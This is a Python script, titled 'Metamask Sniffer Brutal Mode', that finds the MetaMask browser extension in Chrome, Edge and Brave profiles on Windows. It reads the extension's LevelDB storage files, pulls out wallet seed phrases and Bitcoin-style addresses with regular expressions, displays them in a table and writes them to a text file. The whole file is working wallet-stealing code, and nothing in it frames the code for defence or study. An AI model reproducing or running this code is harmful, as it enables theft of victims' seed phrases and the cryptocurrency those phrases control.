import os
import re
import threading
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.panel import Panel

console = Console()
BROWSER_PATHS = {
    "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
    "Edge": os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
    "Brave": os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
}
EXT_ID = "nkbihfbeogaeaoehlefnkodbefgpgknn"
SEED_REGEX = re.compile(r'"mnemonic":"([^"]+)"')
ADDR_REGEX = re.compile(r"\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b")
results = []
stats = {'versions': 0, 'seeds': 0, 'addresses': 0, 'files': 0}


def find_metamask_versions():
    for base in BROWSER_PATHS.values():
        ext_base = os.path.join(base, 'Default', 'Extensions', EXT_ID)
        if os.path.isdir(ext_base):
            for ver in os.listdir(ext_base):
                stats['versions'] += 1
                yield os.path.join(ext_base, ver)


def parse_leveldb(path):
    stats['files'] += 1
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            for m in SEED_REGEX.finditer(line):
                stats['seeds'] += 1
                results.append(('seed', m.group(1), path))
            for a in ADDR_REGEX.findall(line):
                stats['addresses'] += 1
                results.append(('address', a, path))


def scan_leveldb():
    progress = Progress(SpinnerColumn(), TextColumn("Scanning {task.fields[ver]}"), BarColumn(), TimeElapsedColumn(), console=console)
    tasks = {}
    with progress:
        for ver_dir in find_metamask_versions():
            db_dir = os.path.join(ver_dir, 'Local Storage', 'leveldb')
            if not os.path.isdir(db_dir): continue
            for fname in os.listdir(db_dir):
                if not fname.endswith('.ldb'): continue
                fp = os.path.join(db_dir, fname)
                tasks[fp] = progress.add_task(f"{os.path.basename(ver_dir)}", ver=os.path.basename(ver_dir), start=False)
        for fp, task in tasks.items():
            progress.start_task(task)
            try:
                parse_leveldb(fp)
            except Exception as e:
                console.log(f"[red]Error parsing {fp}:[/red] {e}")
            progress.update(task, advance=100)


def show_stats():
    console.rule("[bold magenta]Metamask Sniffer Summary[/bold magenta]")
    tbl = Table(show_header=True)
    tbl.add_column("Metric"); tbl.add_column("Count", justify="right")
    for k,v in stats.items(): tbl.add_row(k, str(v))
    console.print(tbl)


def main():
    console.clear(); console.print(Panel.fit("[bold magenta]Metamask Sniffer Brutal Mode[/bold magenta]", border_style="magenta"))
    scan_leveldb()
    show_stats()
    if results:
        table = Table(show_header=True, header_style="bold cyan")
        table.add_column("Type"); table.add_column("Data", overflow="fold"); table.add_column("Source File", overflow="fold")
        for typ,data,src in results:
            table.add_row(typ, data, src)
        console.print(table)
    out = os.path.join('output','metamask_sniff.txt')
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out,'w',encoding='utf-8') as f:
        for typ,data,src in results: f.write(f"{typ}|{data}|{src}\n")
    console.print(f"[green]✔ Saved to {out}[/green]")

if __name__=='__main__': main()